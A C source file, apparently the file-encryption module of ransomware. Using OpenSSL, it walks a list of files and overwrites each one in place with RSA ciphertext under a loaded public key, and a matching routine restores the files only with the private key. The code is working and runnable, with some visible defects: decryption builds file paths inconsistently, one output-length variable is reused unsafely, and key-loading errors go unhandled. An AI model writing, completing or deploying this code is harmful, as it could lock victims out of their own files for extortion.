#include <stdio.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/decoder.h>
#include <openssl/core_dispatch.h>
#include <openssl/bio.h>

#include "crypto_rsa.h"

static unsigned char* get_file_content(char* p_filePath, size_t* p_inLen)
{
    /* Open file */
    FILE* p_file = fopen(p_filePath, "rb");
    if (p_file == NULL)
    {
        perror("[-] fopen failed");
        exit(1);
    }

    /* Compute the size of the file */
    fseek(p_file, 0, SEEK_END);
    size_t inLen = ftell(p_file);
    *p_inLen = inLen;
    fseek(p_file, 0, SEEK_SET);

    /* Allocate memory for buffers */
    unsigned char* inBuf = malloc(sizeof(unsigned char) * inLen);
    if (inBuf == NULL)
    {
        perror("[-] malloc failed");
        exit(1);
    }

    /* Read file content */
    if (fread(inBuf, 1, inLen, p_file) != inLen)
    {
        perror("[-] fread failed");
        fclose(p_file);
        exit(1);
    }

    /* Close file */
    fclose(p_file);

    return inBuf;
}

static void encrypt_file(fileData* p_fileData, EVP_PKEY* p_pubKey)
{
    /* Construct file path */
    char* p_filePath = malloc(strlen(p_fileData->p_path) + strlen(p_fileData->p_name) + 2);
    if (p_filePath == NULL)
    {
        perror("[-] malloc failed");
        exit(1);
    }
    sprintf(p_filePath, "%s/%s", p_fileData->p_path, p_fileData->p_name);

    /* Buffers environment */
    size_t inLen = 0;
    unsigned char* inBuf = get_file_content(p_filePath, &inLen);
    unsigned char* outBuf = NULL;
    size_t outLen = 0;

    size_t keySize = EVP_PKEY_size(p_pubKey);

    /* Split plain text in keySize - Padding size to encrypt big files */
    int nbBlocks = inLen / (keySize - PADDING_SIZE);
    int rest = inLen % (keySize - PADDING_SIZE);

    /* Encryption environment initialisation */
    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(p_pubKey, NULL);
    EVP_PKEY_encrypt_init(ctx);

    /* Calculate the size required to hold the encrypted data */
    //if (EVP_PKEY_encrypt(ctx, NULL, &outLen, inBuf, inLen) <= 0) {
    //    perror("[-] Size computation failed\n");
    //    exit(2);
    //}

    outLen = (nbBlocks + (rest > 0)) * keySize;

    outBuf = OPENSSL_zalloc(outLen);
    if(outBuf == NULL)
    {
        perror("[-] OPENSSL_zalloc failed\n");
        exit(2);
    }


    /* Encrypt each block and put encrypted data in outBuf */
    for (int i = 0; i < nbBlocks; i++)
    {
        if (!EVP_PKEY_encrypt(ctx, outBuf + i * keySize, &keySize, inBuf + i * (keySize - PADDING_SIZE), keySize - PADDING_SIZE)) {
            perror("[-] Encryption failed\n");
            exit(2);
        }
    }

    /* Encrypt the last block if rest no null */
    if (rest != 0)
    {
        if (!EVP_PKEY_encrypt(ctx, outBuf + nbBlocks * keySize, &keySize, inBuf + nbBlocks * (keySize - PADDING_SIZE), rest)) {
            perror("[-] Encryption failed\n");
            exit(2);
        }
    }

    /* Open the file in write mode */
    FILE* p_file = fopen(p_filePath, "wb");
    if (p_file == NULL)
    {
        perror("[-] fopen failed");
        exit(1);
    }

    /* Write the encrypted data to the file */
    if (fwrite(outBuf, 1, outLen, p_file) != outLen)
    {
        perror("[-] fwrite failed");
        fclose(p_file);
        exit(1);
    }

    /* Close the file */
    fclose(p_file);

    /* free memory */
    EVP_PKEY_CTX_free(ctx);
    free(p_filePath);
    free(inBuf);
    free(outBuf);
    ctx = NULL, p_filePath = NULL, inBuf = NULL, outBuf = NULL;
}

static void decrypt_file(fileData* p_fileData, EVP_PKEY* p_privKey)
{

    /* Construct file path */
    char* p_filePath = malloc(strlen(p_fileData->p_path) + strlen(p_fileData->p_name) + 2);
    if (p_filePath == NULL)
    {
        perror("[-] malloc failed");
        exit(1);
    }
    sprintf(p_filePath, "%s%s", p_fileData->p_path, p_fileData->p_name);

    /* Buffers environment */
    size_t inLen = 0;
    unsigned char* inBuf = get_file_content(p_filePath, &inLen);
    unsigned char* outBuf = NULL;
    size_t outAlloc = 0;
    size_t outLen = 0;
    size_t inBlockSize = 0;

    size_t keySize = EVP_PKEY_size(p_privKey);
    inBlockSize = keySize;

    /* Split cipher text in block to decrypt it */
    int nbBlocks = inLen / keySize;

    /* Encryption environment initialisation */
    EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new(p_privKey, NULL);
    EVP_PKEY_decrypt_init(ctx);

    /* Calculate the size required to hold the decrypted data */
    //if (EVP_PKEY_decrypt(ctx, NULL, &outLen, inBuf, inLen) <= 0) {
    //    perror("[-] Size computation failed\n");
    //    exit(2);
    //}

    outAlloc = nbBlocks * (keySize - PADDING_SIZE);

    outBuf = OPENSSL_zalloc(outAlloc);
    if(outBuf == NULL)
    {
        perror("[-] OPENSSL_zalloc failed\n");
        exit(2);
    }

    /* Decrypt each block and put decrypted data in outBuf */
    for (int i = 0; i < nbBlocks; i++)
    {
        keySize = inBlockSize;
        if(!EVP_PKEY_decrypt(ctx, outBuf + i * (inBlockSize - PADDING_SIZE), &keySize, inBuf + i * inBlockSize, inBlockSize))
        {
            perror("[-] Decryption failed\n");
            exit(2);
        }
        outLen += keySize;
        //printf("i: %ld\n", keySize);
    }

    /* Open the file in write mode */
    FILE* p_file = fopen(p_filePath, "wb");
    if (p_file == NULL)
    {
        perror("[-] fopen failed");
        exit(1);
    }

    /* Write the decrypted data to the file */
    if (fwrite(outBuf, 1, outLen, p_file) != outLen)
    {
        perror("[-] fwrite failed");
        fclose(p_file);
        exit(1);
    }

    /* Close files */
    fclose(p_file);

    /* free memory */
    free(p_filePath);
    free(inBuf);
    free(outBuf);
    EVP_PKEY_CTX_free(ctx);
    ctx = NULL, p_filePath = NULL, inBuf = NULL, outBuf = NULL;
}

void rsa_encrypt_files(listFileData* p_listFileData, EVP_PKEY* p_pubKey)
{
    /* Browse all files to encrypt them */
    fileData* p_currentFile = p_listFileData->p_head;
    while (p_currentFile != NULL)
    {
        encrypt_file(p_currentFile, p_pubKey);
        p_currentFile = p_currentFile->p_next;
    }
}

void rsa_decrypt_files(listFileData* p_listFileData, EVP_PKEY* p_privKey)
{
    /* Browse all files to decrypt them */
    fileData* p_currentFile = p_listFileData->p_head;
    while (p_currentFile != NULL)
    {
        decrypt_file(p_currentFile, p_privKey);
        p_currentFile = p_currentFile->p_next;
    }
}

EVP_PKEY* rsa_load_key(char* p_filename, int selection )
{
    OSSL_DECODER_CTX *dctx;
    EVP_PKEY *pkey = NULL;
    const char *format = "PEM";   /* NULL for any format */
    const char *structure = NULL; /* any structure */
    const char *keytype = "RSA";  /* NULL for any key */

    dctx = OSSL_DECODER_CTX_new_for_pkey(&pkey, format, structure,
                                     keytype,
                                     selection,
                                     NULL, NULL);

    if (dctx == NULL) {
        /* error: no suitable potential decoders found */
        printf("[-] Error no suitable potential decoders found \n");
    }

    /* Open public.pem */
    BIO *bio = BIO_new_file(p_filename, "rb");
    if (bio == NULL) {
        /* error */
        printf("[-] Error opening file\n");
    }

    if (dctx == NULL) {
    /* error: no suitable potential decoders found */
        printf("[-] Error no suitable decoder found \n");
    }
    if (OSSL_DECODER_from_bio(dctx, bio)) {
        /* pkey is created with the decoded data from the bio */
        printf("[+] Key Decoding success %s\n", p_filename);

    } else {
        /* decoding failure */
        printf("[-] Error key decoding\n");
    }
    OSSL_DECODER_CTX_free(dctx);
    BIO_free(bio);

    return pkey;
}